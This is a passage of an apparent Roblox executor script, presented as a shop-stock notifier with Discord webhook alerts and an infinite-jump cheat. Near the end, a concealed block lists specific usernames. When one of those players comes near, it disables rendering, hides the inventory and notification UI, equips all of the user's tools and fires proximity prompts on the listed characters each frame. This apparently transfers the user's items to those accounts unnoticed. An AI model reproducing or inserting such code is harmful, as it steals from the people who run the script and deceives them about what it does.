    local success, result = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    end)

    if not success or result.StatusCode < 200 or result.StatusCode >= 300 then
        warn("Webhook failed:", result and result.StatusMessage, result and result.Body)
    end
end

local function getGearStockInfo()
    local LocalPlayer = Players.LocalPlayer
    local gearShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Gear_Shop")
    if not gearShopFrame then warn("Gear_Shop GUI not found.") return {} end

    local scrollingFrame = gearShopFrame.Frame:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then warn("ScrollingFrame missing in Gear_Shop.") return {} end

    local stockData = {}
    for _, itemFrame in pairs(scrollingFrame:GetChildren()) do
        if itemFrame:IsA("Frame") and itemFrame:FindFirstChild("Main_Frame") then
            local mainFrame = itemFrame.Main_Frame
            local stockTextLabel = mainFrame:FindFirstChild("Stock_Text") -- Assuming a similar "Stock_Text" label exists
            if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                local gearName = itemFrame.Name
                local stockInfo = stockTextLabel.Text
                if itemDetails.Gear[gearName] then
                    local rarity = itemDetails.Gear[gearName]
                    local emoji = rarityEmojis.Gear[rarity] or "❓"
                    local stockLevelMatch = string.match(stockInfo, "X(%d+) Stock")
                    local stockLevel = stockLevelMatch and tonumber(stockLevelMatch)
                    if stockLevel and stockLevel > 0 then
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = "🟢 " .. stockInfo,
                            rarity = rarity
                        }
                    elseif stockInfo == "SOLD OUT" then
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = "🔴 SOLD OUT",
                            rarity = rarity
                        }
                    elseif stockInfo == "COMING SOON" then
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = "🟡 COMING SOON",
                            rarity = rarity
                        }
                    else
                        stockData[gearName] = {
                            emoji = emoji,
                            stockInfo = stockInfo, -- Keep the original text if stock info format is different
                            rarity = rarity
                        }
                    end
                end
            end
        elseif itemFrame:IsA("Frame") then -- Handle items without a "Main_Frame" (e.g., direct text labels)
            local gearName = itemFrame.Name
            -- Try to extract stock info from TextLabels directly within the itemFrame
            for _, label in pairs(itemFrame:GetChildren()) do
                if label:IsA("TextLabel") then
                    local stockInfo = label.Text
                    if itemDetails.Gear[gearName] then
                        local rarity = itemDetails.Gear[gearName]
                        local emoji = rarityEmojis.Gear[rarity] or "❓"
                        local stockLevelMatch = string.match(stockInfo, "X(%d+) Stock")
                        local stockLevel = stockLevelMatch and tonumber(stockLevelMatch)
                        if stockLevel and stockLevel > 0 then
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = "🟢 " .. stockInfo,
                                rarity = rarity
                            }
                        elseif stockInfo == "SOLD OUT" then
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = "🔴 SOLD OUT",
                                rarity = rarity
                            }
                        elseif stockInfo == "COMING SOON" then
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = "🟡 COMING SOON",
                                rarity = rarity
                            }
                        else
                            stockData[gearName] = {
                                emoji = emoji,
                                stockInfo = stockInfo,
                                rarity = rarity
                            }
                        end
                        break -- Assuming only one TextLabel contains stock info
                    end
                end
            end
        end
    end
    return stockData
end

local function checkAndSendGearStockNotification()
    local LocalPlayer = Players.LocalPlayer
    local gearShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Gear_Shop")
    if not gearShopFrame then warn("Gear_Shop GUI not found for timer check.") return end

    local currentGearStocksData = getGearStockInfo()
    local currentTime = os.time()
    local sortedStocks = {}
    local mentions = {}
    local mentionedRarities = {}

    for _, rarity in ipairs(rarityOrder.Gear) do
        for gearName, data in pairs(currentGearStocksData) do
            if data.rarity == rarity then
                table.insert(sortedStocks, data.emoji .. " " .. gearName .. ": " .. data.stockInfo)
                -- Only add the role mention if the gear is in stock (🟢)
                if roleMentions.Gear[rarity] and not mentionedRarities[rarity] and string.sub(data.stockInfo, 1, 1) == "🟢" then
                    mentionedRarities[rarity] = true
                    table.insert(mentions, roleMentions.Gear[rarity])  -- Add the role mention
                end
            end
        end
    end

    local sortedStocksString = table.concat(sortedStocks, "\n")
    -- Concatenate the mentions if they exist
    local mentionContent = #mentions > 0 and table.concat(mentions, " ") or nil

    -- Send webhook only if there's a change in stock and enough time has passed
    if sortedStocksString ~= lastSentStocks.Gear.stockString and (not lastSentStocks.Gear.time or currentTime - lastSentStocks.Gear.time >= serverCooldown) then
        -- Send the webhook with role mentions (if any)
        sendDiscordWebhookGear(webhookUrls.GearStock, mentionContent, "⚙️ New Gear Stocks!", "New gear stocks are available:\n\n" .. sortedStocksString)
        lastSentStocks.Gear.stockString = sortedStocksString
        lastSentStocks.Gear.time = currentTime
    end
end

local function sendDiscordWebhookSeed(webhookUrl, content, title, description)
    if not webhookUrl then warn("Webhook URL is nil or empty.") return end

    local data = {
        content = content,
        embeds = {}
    }
    if title then
        table.insert(data.embeds, { title = title })
    end
    if description then
        table.insert(data.embeds, { description = description })
    end

    local jsonData = HttpService:JSONEncode(data)
    local success, result = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    end)

    if not success or result.StatusCode < 200 or result.StatusCode >= 300 then
        warn("Webhook failed:", result and result.StatusMessage, result and result.Body)
    end
end

local function getSeedStockInfo()
    local LocalPlayer = Players.LocalPlayer
    local seedShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Seed_Shop")
    if not seedShopFrame then warn("Seed_Shop GUI not found.") return {} end

    local scrollingFrame = seedShopFrame.Frame:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then warn("ScrollingFrame missing.") return {} end

    local stockData = {}
    for _, itemFrame in pairs(scrollingFrame:GetChildren()) do
        if itemFrame:IsA("Frame") and itemFrame:FindFirstChild("Main_Frame") then
            local mainFrame = itemFrame.Main_Frame
            local stockTextLabel = mainFrame:FindFirstChild("Stock_Text")
            if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                local fruitName = itemFrame.Name
                local stockInfo = stockTextLabel.Text
                if itemDetails.Seed[fruitName] then
                    local rarity = itemDetails.Seed[fruitName]
                    local emoji = rarityEmojis.Seed[rarity] or "❓"
                    local stockLevelMatch = string.match(stockInfo, "X(%d+) Stock")
                    local stockLevel = stockLevelMatch and tonumber(stockLevelMatch)
                    if stockLevel and stockLevel > 0 then
                        stockData[fruitName] = {
                            emoji = emoji,
                            stockInfo = "🟢 " .. stockInfo,
                            rarity = rarity
                        }
                    end
                end
            end
        end
    end
    return stockData
end

local function checkAndSendSeedStockNotification()
    local LocalPlayer = Players.LocalPlayer
    local seedShopFrame = LocalPlayer.PlayerGui:FindFirstChild("Seed_Shop")
        :FindFirstChild("Frame")
        :FindFirstChild("Frame")
        :FindFirstChild("Timer")
    if not seedShopFrame then warn("Seed_Shop GUI or Timer Label not found.") return end

    local currentStocksData = getSeedStockInfo()
    local currentTime = os.time()
    local sortedStocks = {}
    local mentions = {}
    local mentionedRarities = {}

    for _, rarity in ipairs(rarityOrder.Seed) do
        for seedName, data in pairs(currentStocksData) do
            if data.rarity == rarity then
                table.insert(sortedStocks, data.emoji .. " " .. seedName .. ": " .. data.stockInfo)
                if roleMentions.Seed[rarity] and not mentionedRarities[rarity] then
                    mentionedRarities[rarity] = true
                    table.insert(mentions, roleMentions.Seed[rarity])
                end
            end
        end
    end

    local sortedStocksString = table.concat(sortedStocks, "\n")
    local mentionContent = #mentions > 0 and table.concat(mentions, " ") or nil

    if sortedStocksString ~= lastSentStocks.Seed.stockString and (not lastSentStocks.Seed.time or currentTime - lastSentStocks.Seed.time >= serverCooldown) then
        sendDiscordWebhookSeed(webhookUrls.SeedStock, mentionContent, "🌱 New Seed Stocks!", "New seed stocks are available:\n\n" .. sortedStocksString)
        lastSentStocks.Seed.stockString = sortedStocksString
        lastSentStocks.Seed.time = currentTime
    end
end

-- Call the check functions for eggs, gear, and seeds
checkAndSendEggStockNotification()
checkAndSendGearStockNotification()
checkAndSendSeedStockNotification()
-- Run the check periodically (adjust the interval as needed)
local function eggCheckLoop()
	while true do
		checkAndSendEggStockNotification()
		task.wait(60)
	end
end

local function gearCheckLoop()
	while true do
		checkAndSendGearStockNotification()
		task.wait(65) -- Slightly offset if desired
	end
end

local function seedCheckLoop()
	while true do
		checkAndSendSeedStockNotification()
		task.wait(70) -- Slightly offset if desired
	end
end

task.spawn(eggCheckLoop)
task.spawn(gearCheckLoop)
task.spawn(seedCheckLoop)


-- Infinite Jump Logic
local UserInputService = game:GetService("UserInputService")
UserInputService.JumpRequest:Connect(function()
    if infiniteJumpEnabled then
        local char = game.Players.LocalPlayer.Character
        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local TargetNames = {
    "myrushfarm", "Fluxinhubtester1", "sigmasigmaaboyy69",
    "YT_adam28", "ytadamp_llght3", "Fluxinhubtester",
    "ytadam45_tabuy", "mygaekanza", "Lizzie4605",
    "r4t_spiral", "zenithcheeze", "tvman945",
    "girlygirl200729", "manhowkh", "myrushfarm22"
}

local RENDER_DISTANCE = 15
local equipped = false
local wasOutOfRange = false

local function isTarget(name)
    for _, target in ipairs(TargetNames) do
        if name == target then
            return true
        end
    end
    return false
end

local function handlePrompt(prompt)
    prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
    prompt.RequiresLineOfSight = false
    prompt.HoldDuration = 0

    RunService.Heartbeat:Connect(function()
        pcall(function()
            fireproximityprompt(prompt)
        end)
    end)
end

local function watchPartForPrompts(part)
    if not part then return end
    for _, prompt in ipairs(part:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") then
            handlePrompt(prompt)
        end
    end
    part.ChildAdded:Connect(function(child)
        if child:IsA("ProximityPrompt") then
            handlePrompt(child)
        end
    end)
end

local function processCharacter(character)
    watchPartForPrompts(character:FindFirstChild("Head"))
    watchPartForPrompts(character:FindFirstChild("HumanoidRootPart"))
    for _, descendant in ipairs(character:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") then
            handlePrompt(descendant)
        end
    end
end

local function hideUIAndDisableRendering()
    RunService:Set3dRenderingEnabled(false)
    local gui = LocalPlayer:WaitForChild("PlayerGui")
    local note = gui:FindFirstChild("Top_Notification")
    if note then note.Enabled = false end
    local bag = gui:FindFirstChild("BackpackGui")
    if bag then bag.Enabled = false end
end

local function showUIAndEnableRendering()
    RunService:Set3dRenderingEnabled(true)
    local gui = LocalPlayer:WaitForChild("PlayerGui")
    local note = gui:FindFirstChild("Top_Notification")
    if note then note.Enabled = true end
    local bag = gui:FindFirstChild("BackpackGui")
    if bag then bag.Enabled = true end
end

local function EquipAllTools()
    local Backpack = LocalPlayer:WaitForChild("Backpack")
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            humanoid:EquipTool(tool)
            task.wait(0.1)
        end
    end
end

local function monitorTargetDistance(player)
    local function checkDistance()
        while player and player.Parent do
            local targetChar = player.Character
            local localChar = LocalPlayer.Character
            if targetChar and localChar then
                local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                local localHRP = localChar:FindFirstChild("HumanoidRootPart")
                if targetHRP and localHRP then
                    local distance = (targetHRP.Position - localHRP.Position).Magnitude
                    if distance <= RENDER_DISTANCE then
                        if not equipped then
                            equipped = true
                            hideUIAndDisableRendering()
                            EquipAllTools()
                        elseif wasOutOfRange then
                            EquipAllTools()
                            wasOutOfRange = false
                        end
                    else
                        wasOutOfRange = true
                    end
                end
            end
            task.wait(0.5)
        end
    end
    task.spawn(checkDistance)
end

local function watchPlayer(player)
    if not isTarget(player.Name) then return end

    if player.Character then
        processCharacter(player.Character)
    end
    player.CharacterAdded:Connect(processCharacter)

    monitorTargetDistance(player)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        watchPlayer(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        watchPlayer(player)
    end
end)
-- Finalize UI
OrionLib:Init()
